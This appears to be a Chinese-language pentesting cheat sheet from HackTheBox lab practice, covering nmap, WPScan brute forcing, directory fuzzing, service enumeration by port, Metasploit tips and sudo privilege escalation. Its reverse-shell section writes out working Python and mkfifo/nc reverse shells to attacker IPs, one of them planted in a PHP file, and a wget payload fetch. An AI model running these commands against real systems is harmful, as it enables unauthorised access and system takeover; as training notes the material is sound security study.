## 信息收集

### nmap
nmap 参数详解 https://www.freebuf.com/sectool/264941.html

（以下记录一些HTB中用过的方便再次查找）

标准服务检测：nmap -sV ip //-sV 尝试确定端口服务版本

扫描所有65535端口：nmap -p- ip

sudo nmap -T4 -A -p port ip  //T4 提高扫描速率; A 探测系统类型、服务版本、脚本扫描和跟踪路由

### WPScan
常用命令：

`wpscan --url https://brainfuck.htb --disable-tls-checks --api-token $WPSCAN_API`  //这里使用disable-tls-checks绕过证书检查，不然脚本不会运行。

`wpscan --url https://brainfuck.htb/ --enumerate u` //猜解用户

`wpscan --url https://www.xxxxx.wiki/ -e u --wordlist /root/password.txt` // 暴力破解

`wpscan -u https://www.xxxxx.wiki/ -enumerate p` //扫描插件

### 目录发现

#### dirsearch

1. 遇到 `403 /cgi-bin/`的时候，可以dirbuster、gobuster或者其他目录fuzz工具[进一步探索cgi-bin目录下的后缀名为`cgi​, sh​, ​pl​, ​py...`的文件。](https://twitter.com/_johnhammond/status/1348253792530280448)

#### gobuster 

1. [常用命令1](https://vk9-sec.com/gobuster-how-to/)
2. [常用命令2](https://blog.intigriti.com/2021/07/05/hacker-tools-gobuster/)
3. [原项目](https://github.com/OJ/gobuster)
4. 搜目录：`gobuster dir -k -u https://10.10.10.43 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -o scans/gobuster-https-root-medium -t 20`

## 端口和用到的端口命令

### port 21 ftp
1. 连接方式：`sudo ftp [ip或者host]`
2. 匿名者登录模式：
   ```
	sudo ftp [ip]
	Connected to [ip].
	220 (vsFTPd 2.3.4)
	Name ([ip]:[id]): anonymous  //这里输入anonymous使用匿名者模式（需要服务器开启anonymous_enable=YES）
	331 Please specify the password.
	Password:					//这里直接回车
	230 Login successful.
	Remote system type is UNIX.
	Using binary mode to transfer files.
   ```
3. ftp 内常用命令 https://www.cnblogs.com/answerThe/p/11463117.html
  * 查看文件-get {filename}
  * bye  退出ftp

4. 存在后门的特征
   ```
	21/tcp  open  ftp         vsftpd 2.3.4
   ```

### port 22 SSH

[链接](https://book.hacktricks.xyz/network-services-pentesting/pentesting-ssh)

主要是暴力破解，可挖性比较低

### port 23 Telnet

1. port 23 telnet: telnet {IP} (该说不说这种默认口令port23真的已经很少很少了吧)

### port 25,465,587 SMTP

[Simple Mail Transfer Protocol](https://book.hacktricks.xyz/network-services-pentesting/pentesting-smtp#sniffing)

### port 110 POP

[Post Office Protocol](https://book.hacktricks.xyz/network-services-pentesting/pentesting-pop#hacktricks-automatic-commands)

### port 143 imap

[imap](https://book.hacktricks.xyz/network-services-pentesting/pentesting-imap)

### port 139,445 SMB
https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb
```
For instance, on Windows, SMB can run directly over TCP/IP without the need for NetBIOS over TCP/IP. This will use, as you point out, port 445. On other systems, you’ll find services and applications using port 139. This means that SMB is running with NetBIOS over TCP/IP**.**
```
1. port 139
2. port 445 SMB :
	* smbclient : 用于连接和传输文件的脚本（linux based）
	* 不知道用户账密时：使用访客或匿名模式查看分享文件夹，`smbclient -L {target_IP}`
	* 探知未配置访问控制的分享文件`smbclient \\\\{target_IP}\\{foldername}`

### port 6379
1. port 6379 Redis:
	* redis 未授权访问 https://blog.csdn.net/qq_41210745/article/details/103309137 
	* `info 获取redis信息`， `select {数字} 切换到指定数据库`，`keys * 列出所有key名称`，`get {key} 获取某个key的内容`

## 漏洞利用

### Metasploit

**注意，在打靶机连了VPN的情况下，（主要在反弹shell场景下）需要将本地监听LHOST改为VPN提供的IP**

在exploit跑不通时，排查如下几个方面：
1. 将本地监听LHOST改为VPN提供的IP
2. 注意指定rhost攻击时，可能也需要指定rport
3. `show payloads`拿到实际payload列表自行尝试单个payload
4. 卸载重装最新版本 `sudo apt-get remove --auto-remove metasploit-framework`


## 提权

### 低权限shell提权案例


```
10.10.10.56> sudo -l
Matching Defaults entries for shelly on Shocker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User shelly may run the following commands on Shocker:
    (root) NOPASSWD: /usr/bin/perl
10.10.10.56> sudo perl -e 'exec "/bin/bash"'
10.10.10.56> whoami
root
```

```
$ sudo -l 
Matching Defaults entries for www-data on bashed:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
$ sudo -u scriptmanager /bin/bash
bash: cannot set terminal process group (822): Inappropriate ioctl for device
bash: no job control in this shell
scriptmanager@bashed:/$ 
```

### 反弹shell

```
本地：
sudo nc -nvlp 1111
受害服务器：
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.2",1111));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

```
nibbler@Nibbles:/home/nibbler/personal/stuff$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.154 8083 > /tmp/f" >> monitor.sh
< /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.154 8083 > /tmp/f" >> monitor.sh
nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo /home/nibbler/personal/stuff/monitor.sh
```

```
root@kali:~/hackthebox/nibbles-10.10.10.75# cat callback.php
<?php system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.154 8082 >/tmp/f"); ?>
```

### 远程文件包含获取shell

```
本地：
sudo python3 -m http.server 80 //shell文件放在开启该命令的文件夹下，如根目录
受害服务器：
wget 10.10.16.2/new.py
```
### 冰蝎联动msf获取反弹shell

https://blog.csdn.net/weixin_45745344/article/details/112321742

